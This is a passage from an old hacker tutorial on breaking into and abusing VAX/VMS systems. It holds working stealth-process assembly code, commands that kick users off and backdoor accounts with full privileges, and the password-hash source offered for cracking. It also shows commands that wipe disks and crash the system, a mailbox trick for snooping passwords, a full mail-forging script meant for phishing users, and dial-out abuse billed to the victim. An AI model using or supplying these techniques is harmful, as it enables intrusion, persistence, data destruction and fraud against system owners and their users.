+$DEF    ISB$K_SIZE              ; Size of ISB
+$DEFEND ISB
+
+;
+; $CRELNM and $TRNLNM data structures:
+;
+lnm_retlen:     .blkl   1
+lnm_buffer:     .blkb   isb$k_size
+lnm_buflen = . - lnm_buffer
+;
+; Itemlist for $CRELNM and $TRNLNM:
+;
+lnm_itmlst:
+        .word   lnm_buflen      ; Buffer length
+        .word   lnm$_string     ; Item code
+        .address lnm_buffer     ; Buffer address
+        .address lnm_retlen     ; Return length (unused by $CRELNM)
+        .long   0               ; Terminate item list
+;
+; Itemlist for $GETJPIW:
+;
+jpi_itmlst:
+        .word   <pcb$s_lname>   ; Buffer length
+        .word   jpi$_prcnam     ; Item code
+        .long   -               ; Buffer address
+        <lnm_buffer+isb$t_lname>
+        .long   -               ; Return length (used by $SETPRN)
+        <lnm_buffer+isb$l_namelen>
+        .long   0               ; Terminate item list
+;
+prcnam_desc:
+        .blkl   1               ; Filled later
+        .long   -               ; Address of string (inside of ISB)
+        <lnm_buffer+isb$t_lname>
+;
+; Parameters to be used by call to $CRELNM and $TRNLNM:
+;
+lnm_tabnam:     .ascid  -       ; Use process logical name table
+                "LNM$PROCESS_TABLE"
+lnm_lognam:     .ascid  -       ; Use ISB as the logical name
+                "ISB"
+;
+; Other assorteds:
+;
+sysuic: .long   ^x00010004      ; New UIC ([1,4])
+prcnam: .ascid  "SYMBIONT_nnnn" ; New process name
+prc_1:  .ascid  "SYMBIONT_"     ; Start of name
+prc_2:  .ascid  "nnnn"          ; End of name
+count:  .long   1               ; Longword count of number (nnnn)
+
+        .entry invisible,^m<>
+        $cmkrnl_s       routin=invisible_k      ; Do it all in Kernel mode
+        ret                                     ; and exit
+
+        .entry invisible_k,^m<r2,r3,r4,r5,r6>
+        moval   lnm_buffer,r6                   ; Get pointer to ISB
+        bbss    #pcb$v_inter,-                  ; If we are visible, then
+                pcb$l_sts(r4),-                 ; Go into Stealth mode
+                stealth
+        brw     unstealth                       ; Else go into Unstealth
+
+stealth:
+        bicl    #pcb$m_inter,pcb$l_sts(r4)      ; Clear the interactive bit
+        bisl    #pcb$m_noacnt,pcb$l_sts(r4)     ; Disable accounting
+        decw    g^sys$gw_ijobcnt                ; Decrement job count
+        movb    pcb$t_terminal(r4),-            ; Store terminal name length
+                isb$b_terminal(r6)
+        clrb    pcb$t_terminal(r4)              ; Clear the terminal name len
+        movl    pcb$l_jib(r4),r5                ; Get Job Information Block adr
+        movb    jib$b_jobtype(r5),-             ; Save job type
+                isb$b_jobtype(r6)
+        clrb    jib$b_jobtype(r5)               ; And clear it
+        movl    pcb$l_uic(r4),-                 ; Save old UIC
+                isb$l_uic(r6)
+        movl    sysuic,pcb$l_uic(r4)            ; And set system uic
+        $getjpiw_s      itmlst=jpi_itmlst       ; Get process name
+        $crelnm_s       tabnam=lnm_tabnam,-     ; Store ISB
+                        lognam=lnm_lognam,-
+                        acmode=#psl$c_exec,-
+                        itmlst=lnm_itmlst
+;
+; Now set a process name of the first unique nnnn for SYMBIONT_nnnn:
+;
+10$:
+        pushl   #4      ; Dealing with longwords
+        pushl   #4      ; And we want 4 digits
+        pushal  prc_2   ; Put it in here
+        pushal  count   ; And get it from here
+        calls   #4,g^ots$cvt_l_tz
+        blbc    r0,20$
+        incl    count   ; Just in case this name is in use we ready the next
+        pushal  prc_2   ; Append this
+        pushal  prc_1   ; To this
+        pushal  prcnam  ; And put it in here
+        calls   #3,g^str$concat
+        blbc    r0,20$
+        $setprn_s       prcnam=prcnam
+        cmpl    r0,#ss$_duplnam
+        beql    10$
+20$:
+        ret                                     ; And return to user mode
+
+
+unstealth:
+        $trnlnm_s       tabnam=lnm_tabnam,-     ; Get ISB
+                        lognam=lnm_lognam,-
+                        acmode=#psl$c_exec,-
+                        itmlst=lnm_itmlst
+        blbc    r0,30$
+
+        $dellnm_s       tabnam=lnm_tabnam,-     ; Delete logical name (ISB)
+                        lognam=lnm_lognam,-
+                        acmode=#psl$c_exec
+        blbc    r0,30$
+
+        bisl    #pcb$m_inter,pcb$l_sts(r4)      ; Set the interactive bit
+        bicl    #pcb$m_noacnt,pcb$l_sts(r4)     ; Enable accounting
+        incw    g^sys$gw_ijobcnt                ; Increment job count
+        movl    isb$l_uic(r6),-                 ; Restore UIC
+                pcb$l_uic(r4)
+        movb    isb$b_terminal(r6),-            ; Restore terminal name length
+                pcb$t_terminal(r4)
+        movl    pcb$l_jib(r4),r5
+        movb    isb$b_jobtype(r6),-             ; Restore job type
+                jib$b_jobtype(r5)
+        movl    isb$l_namelen(r6),prcnam_desc   ; Fix descriptor length
+
+        $setprn_s       prcnam=prcnam_desc      ; Restore process name
+
+        movl    #ss$_normal,r0
+30$:
+        ret
+        .end    invisible
+
+
+To kick everyone off the system, type the following:
+
+        $ stop "SYSTEM"
+        $ stop "S14859JD"
+        $ stop "S15124AL"(note: this automatically disables the subprocess also)
+
+If the system tells that you do not have enough privileges, then you can
+kick everyone off by doing the following: (If you have lousy privileges and
+can't STOP the processes, then this is really a waste of time, but it is
+still pretty fun)  
+
+        $ set term/parity=odd ttb0:   ! this stops SYSTEM
+        $ set term/parity=odd ttc5:   ! this gets S14859JD
+        $ set term/parity=odd ttc0:   ! S15124AL (both) are now gone
+
+The above usually only works with VMS 5.3 and below.
+
+To be sure that they don't come back on and start bothering you, I suggest
+you type the following line:
+
+        $ set logins/interactive = 0
+
+Now, you can do your damage. This can come in many ways. Since hackers really
+don't promote destruction of data, I am strongly against deleting or formatting
+the disk. Instead, you should try to maintain your survival on the system for
+as long as possible. This can be done a couple of ways. One is to rename the
+password to another account that is rarely used, and another is to just make
+a whole new account. Both of these techniques require the UAF utility. To get
+into UAF, type the following lines:
+
+        $ set def sys$sysroot:[sysexe]
+        $ run sys$system:authorize
+
+You will now get a prompt that looks like this: "UAF>". At this prompt you
+can do anything to any account on the system. Let's look back at the two ways
+to maintain existence on the system, though. The first one is a little more
+difficult than the second one, and it will be covered first. What is required
+is that you type the following line:
+
+        UAF> show users/nobrief *
+
+You should see extensive information on every account in the system. Stop the
+listing when you see an account that hasn't been used in a couple months or
+more. To modify this account to become your very own, type this:
+
+        UAF> modify accountijustfound /priv=all /pass=whateverpasswordiwant
+
+This line modifies the password to "whateverpasswordiwant" and the privileges
+to ultimate system access in the account, "accountijustfound". The other
+technique is extremely easy but a little more risky. To create a new account
+for yourself named HACKER with all privileges and password VAXHACK, do the
+following:
+
+        UAF> add hacker /pass=vaxhack /uic=[1,40] /noaccounting-
+             /device=sys$sysroot /direct=[sysexe] /privs=all <return>
+
+        My suggestion is that you don't add accounts, but change the passwords
+to accounts that are inactive or have a disuser flag.  What you could also
+do (with a LOT of effort, I may add) is try to crack the SYS$SYSTEM:SYSUAF.DAT
+file.  This file contains all of the user information which is accessed with
+the authorize program.  What I suggest (since VMS uses one-way, unbreakable
+encryption) is to take words from a dictionary, encrypt them, and compare them
+to encrypted passwords in the SYSUAF.DAT file.  The following is the source
+code to the VMS encryption algorithm:
+
+.TITLE HPWD - hash user password
+.IDENT 'V02-002'
+; Hash PassWorD:
+; Hash a password irreversibly. This is one way encryption with
+; no decryption possible.
+
+; This code was obtained by disassembling the AUTHORIZE program.
+; See the VMS microfiche for the fully commented code:
+;         e _lib$code:_lib$code+68
+
+; Input Parameters:
+;      PWDDSC    - Address of password descriptor
+;      ENCRYPT - Encryption algorithm index (byte)
+;      SALT         - Random number (word)
+;      USRDSC  - Address of username descriptor
+
+; Output Parameters:
+;      OUTDSC    - Address of encrypted output descriptor
+
+OUTDSC=4
+PWDDSC=OUTDSC+4
+ENCRYPT=PWDDSC+4
+SALT=ENCRYPT+4
+USRDSC=SALT+4
+
+.PSECT _LIB$CODE    RD,NOWRT,PIC,SHR,BYTE,EXE
+
+AUTODIN:
+     .LONG ^X000000000,^X01DB71064,^X03B6E20C8,^X026D930AC,^X076DC4190
+     .LONG ^X06B6B51F4,^X04DB26158,^X05005713C,^X0EDB88320,^X0F00F9344
+     .LONG ^X0D6D6A3E8,^X0CB61B38C,^X09B64C2B0,^X086D3D2D4,^X0A00AE278
+     .LONG ^X0BDBDF21C
+
+Purdy_Poly:
+c:
+     .LONG -83,-1
+     .LONG -179,-1
+     .LONG -257,-1
+     .LONG -323,-1
+     .LONG -363,-1
+
+.ENTRY    LGI$HPWD,^M<R2,R3,R4>
+     MOVAQ   @outdsc(AP),R4
+     MOVAQ   @4(R4),R4
+     TSTB    encrypt(AP)
+     BGTRU   10$
+     MNEGL   #1,R0
+     MOVAQ   @pwddsc(AP),R1
+     CRC     autodin,R0,(R1),@4(R1)
+     CLRL    R1
+     MOVQ    R0,(R4)
+     BRB     20$
+
+10$: CLRQ    (R4)
+     MOVAQ   @pwddsc(AP),R3
+     BSBB    COLLAPSE_R2
+     ADDW2   salt(AP),3(R4)
+     MOVAQ   @usrdsc(AP),R3
+     BSBB    COLLAPSE_R2
+     PUSHAQ  (R4)
+     CALLS   #1,PURDY
+
+20$: MOVL    #1,R0
+     RET
+
+
+COLLAPSE_R2:
+     MOVZWL  (R3),R0
+     BEQL    20$
+     MOVAL   @4(R3),R2
+     PUSHR   #^M<R1,R2>
+     MOVL    R0,R1
+5$:  CMPB    (R2)+,#32
+     BNEQ    7$
+     DECL    R1
+7$:  SOBGTR  R0,5$
+     MOVL    R1,R0
+     POPR    #^M<R1,R2>
+10$: BICL3   #-8,R0,R1
+     ADDB2   (R2)+,(R4)[R1]
+     SOBGTR  R0,10$
+20$: RSB
+
+a=59
+n0=1@24-3
+n1=1@24-63
+
+
+.ENTRY    PURDY,^M<r2,r3,r4,r5>
+     MOVQ    @4(AP),-(SP)
+     BSBW    PQMOD_R0
+     MOVAQ   (SP),R4
+     MOVAQ   PURDY_POLY,R5
+     MOVQ    (R4),-(SP)
+     PUSHL   #n1
+     BSBB    PQEXP_R3
+     MOVQ    (R4),-(SP)
+     PUSHL   #n0-n1
+     BSBB    PQEXP_R3
+     MOVQ    (R5)+,-(SP)
+     BSBW    PQADD_R0
+     BSBW    PQMUL_R2
+     MOVQ    (R5)+,-(SP)
+     MOVQ    (R4),-(SP)
+     BSBW    PQMUL_R2
+     MOVQ    (R5)+,-(SP)
+     BSBW    PQADD_R0
+     MOVQ    (R4),-(SP)
+     BSBB    PQMUL_R2
+     MOVQ    (R5)+,-(SP)
+     BSBW    PQADD_R0
+     MOVQ    (R4),-(SP)
+     BSBB    PQMUL_R2
+     MOVQ    (R5)+,-(SP)
+     BSBW    PQADD_R0
+     BSBW    PQADD_R0
+     MOVQ    (SP)+,@4(AP)
+     MOVL    #1,R0
+     RET
+
+PQEXP_R3:
+     POPR    #^M<r3>
+     MOVQ    #1,-(SP)
+     MOVQ    8+4(SP),-(SP)
+     TSTL    8+8(SP)
+     BEQL    30$
+10$: BLBC    8+8(SP),20$
+     MOVQ    (SP),-(SP)
+     MOVQ    8+8(SP),-(SP)
+     BSBB    PQMUL_R2
+     MOVQ    (SP)+,8(SP)
+     CMPZV   #1,#31,8+8(SP),#0
+     BEQL    30$
+20$: MOVQ    (SP),-(SP)
+     BSBB    PQMUL_R2
+     EXTZV   #1,#31,8+8(SP),8+8(SP)
+     BRB     10$
+
+30$: MOVQ    8(SP),8+8+4(SP)
+     MOVAQ   8+8+4(SP),SP
+     JMP     (R3)
+
+u=0
+v=u+4
+y=u+8
+z=y+4
+
+PQMOD_R0:
+     POPR    #^M<R0>
+     CMPL    v(SP),#-1
+     BLSSU   10$
+     CMPL    u(SP),#-a
+     BLSSU   10$
+     ADDL2   #a,u(SP)
+     ADWC    #0,v(SP)
+10$: JMP     (R0)
+
+PQMUL_R2:
+     POPR    #^M<r1>
+     MOVL    SP,R2
+     PUSHL   z(R2)
+     PUSHL   v(R2)
+     BSBB    EMULQ
+     BSBB    PQMOD_R0
+     BSBB    PQLSH_R0
+     PUSHL   y(R2)
+     PUSHL   v(R2)
+     BSBB    EMULQ
+     BSBB    PQMOD_R0
+     PUSHL   z(R2)
+     PUSHL   u(R2)
+     BSBB    EMULQ
+     BSBB    PQMOD_R0
+     BSBB    PQADD_R0
+     BSBB    PQADD_R0
+     BSBB    PQLSH_R0
+     PUSHL   y(R2)
+     PUSHL   u(R2)
+     BSBB    EMULQ
+     BSBB    PQMOD_R0
+     BSBB    PQADD_R0
+     MOVQ    (SP)+,Y(R2)
+     MOVAQ   Y(R2),SP
+     JMP     (R1)
+
+EMULQ:
+     EMUL    4(SP),8(SP),#0,-(SP)
+     CLRL    -(SP)
+     TSTL    4+8+4(SP)
+     BGEQ    10$
+     ADDL2   4+8+8(SP),(SP)
+10$: TSTL    4+8+8(SP)
+     BGEQ    20$
+     ADDL2   4+8+4(SP),(SP)
+20$: ADDL2   (SP)+,4(SP)
+     MOVQ    (SP)+,4(SP)
+     RSB
+
+PQLSH_R0:
+.ENABLE LSB
+     POPR    #^M<r0>
+     PUSHL   v(SP)
+     PUSHL   #a
+     BSBB    EMULQ
+     ASHQ    #32,Y(SP),Y(SP)
+     BRB     10$
+
+PQADD_R0:
+     POPR    #^M<R0>
+10$: ADDL2   u(SP),y(SP)
+     ADWC    v(SP),z(SP)
+     BLSSU   20$
+     CMPL    z(SP),#-1
+     BLSSU   30$
+     CMPL    y(SP),#-a
+     BLSSU   30$
+20$: ADDL2   #a,y(SP)
+     ADWC    #0,z(SP)
+30$: MOVAQ   Y(SP),SP
+     JMP     (R0)
+.END
+
+        Now what you are essentially looking for on this system is information
+because that is what a true hacker tries to retrieve. To get a listing of all
+of the directories that are available to you, type:
+
+        $ set def [000000]
+        $ dir *.dir
+
+This will give you a list of directories that you are able to search through.
+If you see something interesting, like a directory called TAXES or CREDIT,
+then simply type:
+
+        $ set def [.taxes]      or      $ set def [.credit]
+        $ dir
+
+Type out everything.  Always leave your capture on.
+
+
+VI. Malicious Hacking on the VAX/VMS
+
+        I never try to use the tactics discussed in the following section when
+I am hacking a VMS system because they are destructive and I only do destructive
+stuff to those who deserve it.  But, this section must be covered to make this
+file complete.
+
+        Destroying files is not recommended, although if you have the "BYPASS"
+privilege, you can wipe out the entire disk drive by typing:
+
+        $ set def [000000]
+        $ del [...]*.*;*
+
+However, most system managers keep backups, but there are the truly stupid
+that don't or leave their backup disks online.  Usually, if the administrator
+is foolish enough to do that, it could be found in the SYS$BACKUP: device.
+Another thing to do that would not involve destroying files, but still can
+be pretty fun is to lock out everyone on the system from their files without
+deleting them. To do this simply type:
+
+        $ set def [000000]
+        $ set protection = (s:rwed, o, g, w) [...]*.*;*
+
+This gives and a few select others access to the person's files, but no one
+else.  However, if you don't find that a thrill, then you may want to aim
+bigger, and lock people off of disk drives.  This is pretty easy, because one
+command can do it.  Let's just say that our disk drive is named DUA0:, then
+you would take it off line by typing:
+
+        $ deallocate dua0:
+
+To bring it back online, the command is:
+
+        $ allocate dua0:
+
+Another way of locking up a drive is by taking it out of service.  This can
+be achieved by typing:
+
+        $ dismount dua0:
+
+Of course, to put it back in service, you would simply replace DISMOUNT with
+MOUNT.  To crash the system, it is as easy as typing:
+
+        $ run sys$system:opccrash
+
+Next, type Control-P and type HALT at the ">>>" prompt.  The system will give
+you a message that it has halted, and it has.
+
+
+VII. Exploiting Security Holes on VAX/VMS
+
+        Although there are no major security holes in VAX/VMS that will
+grant you all privileges, there are holes that when taken advantage of, can
+be used to really mess around with the system, or for social engineering
+purposes.  One of the bigger security holes is with world-wide mailboxes.
+Most applications that support interactive communication between users use
+mailboxes that can be read by the world and written to by the world.  For
+example, the mailboxes created by the phone program are completely world 
+accessible, as well as being easily discovered.  Control codes force PHONE
+to perform different operations.  Suprisingly, the commands typed at the 
+keyboard are treated the same as characters recieved through the mailboxes.   
+To find out the users on the system using phone, and their mailbox names,
+you would type:
+
+$ show logical phn$* 
+
+This works because PHONE creates systemwide logical names formatted as
+PHN$<username>.  Now, how would you force output to a person's screen?  This
+is quite easy once you get their mailbox.  Let's say that after you type
+"show logical phn$*" you discovered that your victim's mailbox name is
+"MBA3791:".  Very basically, (stupid pun intended), go into the BASIC
+interpeter by typing BASIC with no command line parameters at the prompt,
+and type:
+
+open "MBA3791:" for output as file #1
+
+You now have write access to the mailbox.  To write "Hello World" on
+MELINDA's screen, (providing that MELINDA is your victim using "MBA3791:",
+and the name of your node is WHALER) you would type:
+
+print #1, chr$(14);"WHALER::MELINDA";chr$(0);"Hello World"
+
+The format for a command is <cmd-char>NODE::USERNAME<CHR(0)><message>.  There
+are many more control characters besides 14 (control N) which will do many
+different things, and with enough experimentation, you can easily read from
+the mailbox, and parse commands.  The following is a list of control codes
+recognized by the PHONE program and their functions:
+ 
+kbd_get      = chr (1)
+kbd_route    = chr (2)
+cmd_parse    = chr (3)
+talk         = chr (4)
+help2        = chr (5)
+ring_out     = chr (6)
+slave_verify = chr (7)
+rang_in      = chr (8)
+hangup       = chr (9)
+busy         = chr (10)
+answered     = chr (11)
+rejected     = chr (12)
+slave_done   = chr (13)
+listen       = chr (14)
+directory2   = chr (15)
+facsimile2   = chr (16)
+forced_link  = chr (17)
+held         = chr (18)
+unheld       = chr (19)
+ 
+What could you possibly use this for besides aggravating the hell out of
+everyone?  I really can't tell you, but if you can use your knowledge of
+the PHONE program to intercept other communication between users, you may
+have a chance of catching some passwords.
+
+        Another security hole is not in mailboxes, but in MAIL.  Using
+VMS's faulty intranode communications, it is possible to send anonymous
+mail or mail from any user you want.  Since this bug can only be applied
+to MAIL, I will not go into detail as to how everything works, and I will
+only list the source code to an anonymous mail program below.  The use of
+a program such as this could be to send messages from a system administrator
+to users informing them to change their passwords to whatever you want.
+
+$! X-Mail   (xmail.com)               version 1.01
+$ on control_y then goto 5_y_abort
+$symbols:
+$ status = %x1000000!  ! ss$_normal
+$ esc[0,7]=%d27
+$ cls_seq = esc+"[2J"+esc+"[f"
+$ cls := write sys$output cls_seq
+$ say := write sys$output
+$ ask := read sys$command /prompt=
+$ link_open := 0
+$ null_byte[0,7] = 0
+$ E := "<esc>"
+$ tab := "        "
+$ say " "
+$ say "   ***   For help, type a ""?"" or HELP at the XMAIL> prompt.   ***"
+$ say " "
+$ if p1 .eqs. "" then goto semi_loop
+$ goto begin_x
+$semi_loop:
+$ say " "
+$ ask "XMAIL> " cmd
+$ if cmd .eqs. "" then goto semi_loop
+$ rcmd = f$edit(cmd, "UPCASE")
+$ if rcmd .eqs. "HELP" then goto give_help
+$ if rcmd .eqs. "?" then goto give_help
+$ if rcmd .eqs. "QUIT" then goto 5_exit
+$ if rcmd .eqs. "SEND" then goto begin_x
+$ say " "
+$ say "%XMAIL-E-INVCOMD, invalid command, type HELP for assistance."
+$ goto semi_loop
+$give_help:
+$ cls
+$ say " "
+$ say " X-Mail is for sending MAIL messages to from ""bogus"" usernames!!"
+$ say " "
+$ say " Currently the following commands are valid:"
+$ say " "
+$ say "      HELP      - provide user with mini-help"
+$ say "      SEND      - invoke X-Mail for sending fake message"
+$ say "      QUIT      - Exit from X-Mail (from any point)"
+$ say " "
+$ ask "X-Mail Help topic> " xm_help_topic
+$ if xm_help_topic .eqs. "" then goto semi_loop
+$ xm_help_topic = f$edit(xm_help_topic,"UPCASE")
+$ if xm_help_topic .eqs. "SEND" then goto xxx_send
+$ goto semi_loop
+$xxx_send:
+$ cls
+$ say " "
+$ say " "
+$ say "       Useage of X-Mail: "
+$ say " "
+$ say "XMAIL> SEND"         
+$ say "From: PHONEY USERNAME"
+$ say "To: REAL USERNAME"
+$ say "                   If you can't figure it out, you are lame."
+$ say " "
+$ goto semi_loop
+$begin_x:
+$ say " "
+$ link_open = 0
+$ node_name = f$element(0,":",f$logical("sys$node"))
+$ open/read/write/err=5_abort send_link 'node_name'::"27="
+$ link_open = 1
+$ if p3 .eqs. "" then goto 1_xm_send_from
+$ _xm_from = f$edit(p3, "UPCASE")
+$ if p4 .eqs. "" then goto 1_xm_get_personal_name
+$ xm_personal_name = p4
+$ goto 1_form_from_line
+$1_xm_send_from:
+$ ask "From:    " /end=5_exit xm_from
+$ if xm_from .eqs. "" then xm_from = f$getjpi(f$pid(x_pid),"USERNAME")
+$ _xm_from = f$edit(xm_from, "UPCASE")
+$1_xm_get_personal_name:
+$ ask "P Name:  " /end=5_exit xm_personal_name
+$1_form_from_line:
+$ xm_from_line = _xm_from + tab + xm_personal_name
+$ write/err=5_abort send_link xm_from_line
+$ node_name = 0
+$ receivers = 0
+$ return_location := "1_ask_who_to"
+$1_ask_who_to:
+$ if p2 .eqs. "" then goto 1_xm_send_to
+$ xm_send_to = p2
+$ goto 1_xm_send_it
+$1_xm_send_to:
+$    ask "To:      " xm_send_to
+$1_xm_send_it:
+$    on warning then xm_send_to = f$logical("''xm_send_to'")
+$    if (xm_send_to .eqs. "") then goto 1_end_of_line
+$    xm_send_to = f$edit(xm_send_to,"UPCASE")
+$    write/err=5_abort send_link xm_send_to
+$    goto 4_check_link_status
+$1_end_of_line:
+$    write/err=5_abort send_link null_byte
+$  if (receivers .eq. 0) then goto 5_exit
+$  read/prompt="To Show: "/end=5_exit sys$command xm_to_show
+$  xm_to_show = f$edit(xm_to_show,"UPCASE")
+$  write /err=5_abort send_link xm_to_show
+$ ask "Subject: " xm_subject /end=5_exit
+$ write/err=5_abort send_link xm_subject
+$  if (p1 .eqs. "") then goto 2_interactive_input
+$  open/read send_input 'p1'
+$  input := "send_input"
+$  goto 2_write_to_mail_buffer
+$2_interactive_input:
+$    say "Enter your message below. Press CTRL/Z when complete."
+$    input := "sys$command"
+$2_write_to_mail_buffer:
+$    read/prompt=""/end=2_end_of_mail_buffer 'input' mail_txt
+$    write/err=5_abort send_link mail_txt
+$    goto 2_write_to_mail_buffer
+$2_end_of_mail_buffer:
+$    write/err=5_abort send_link null_byte
+$    if (p1 .eqs. "") then close/nolog 'input'
+$    if (p1 .nes. "") then close/nolog 'input'
+$  save_count = receivers
+$  index = 0
+$  return_location := "3_check_delivery"
+$3_check_delivery_status:
+$    goto 4_check_link_status
+$3_check_delivery:
+$    index = index + 1
+$    if (index .ne. save_count) then goto 3_check_delivery_status
+$    goto 5_exit
+$4_check_link_status:
+$    read/err=5_abort send_link mail_status
+$    if (f$cvsi(0,1,mail_status) .eq. -1) then goto 4_valid_message
+$4_errmsg:
+$    read/err=5_abort send_link mail_status
+$    if (f$length(mail_status) .ne. 1) then goto 4_write_message
+$    if (f$cvsi(0,8,mail_status) .eq. 0) then goto 'return_location'
+$4_write_message:
+$    write sys$error mail_status
+$    say mail_status
+$    goto 4_errmsg
+$4_valid_message:
+$    receivers = receivers + 1
+$    goto 'return_location'
+$5_y_abort:
+$    write sys$error "%XMAIL-E-USERINT, Control Y pressed, exiting X-Mail..."
+$    status = %xffffffff
+$    goto 5_exit
+$5_abort:
+$    write sys$error "%SEND-E-TOUGHLUCK, network com error."
+$    status = %xffffffff
+$5_exit:
+$    if (link_open .ne. 0) then close/nolog send_link /nolog
+$    ! exit (status + ( 0 * f$verify(ver_con)))
+$5_real_exit:
+$    exit
+
+
+VIII. Using a Hacked VMS to Infiltrate Other Systems
+
+        One of the most common abuses for VMS systems is dialing out.
+Usually dialing out requires OPER privileges because the modem terminals are
+almost always protected.  However, if you do somehow have RW access to a
+modem terminal, then you can dialout either of the following two ways. 
+
+        The first way is just as simple and efficient as the second way,
+but it will not work on every single VMS system.  If the number you wish
+to dial is (508)998-2400, you would use the following command:
+
+$ set host/dte txa0: /dial=number:15089982400
+
+This is, of course, assuming that TXA0: is a modem terminal.  The second way
+to dial out is to run KERMIT, and directly connect to TXA0:, and issue
+standard modem commands.  A sample session follows:
+
+$ RUN SYS$SYSTEM:KERMIT
+
+Kermit-32> connect txa0:
+Connected to TXA0:.  Press ^C when done.
+
+ATZ
+OK
+ATDT15089982400
+
+        If the VAX you have hacked into is hooked up on a packet switching 
+system such as DATAPAC or TELENET, then there is another USEFUL thing you can 
+perform. To call out NUA's use the /X29 qualifier. For example:
+
+$ set host/x29 031121200055920
+
+This would call up the NUA 031121200055920.  What is interesting to note is 
+that on many VAX's you can call out to foreign remote nodes such as in the 
+example and the charge for the collect call is placed to the account through 
+which you are logged in as.  This is a safe and easy method to call out to 
+PSDN's which are normally long distance from you.  It should be noted that
+many system managers turn off foreign DNICs, which may limit you to calling
+only within your local DNIC.
+ 
+        Last but not least, if the VAX system which you have hacked is on
+the Internet, you can use the standard MULTINET package to perform TELNET,
+FTP, and USENET functions.  If you are not familiar with the Internet, please
+read "Zen and the Art of the Internet" or any similar text.
+
+IX. Conclusion
+
+        I hope you enjoyed this file and found it informative.  This file
+was not intended to be an advanced course in VMS hacking, but an introductory
+text with basic hacking algorithms and procedures.  Much of the material I
+have learned through experience, but some of it I have acquired through
+other sources.  If you have any comments, please write me and the Xenon
+Foundation at loxsmith@vod.xf.com or call up the HQ board, the Void of
+Deception at 508-998-2400.  All new Operation: 54 journals and releases
+by me can be found there.
+
+Special thanks to:  
+  
+  Erik Turbo - for getting me started.
+
+  All Operation: 54 members - for making hacking interesting again.
+
+  The FBI - for adding spice to my life.
+
+                                Loxsmith
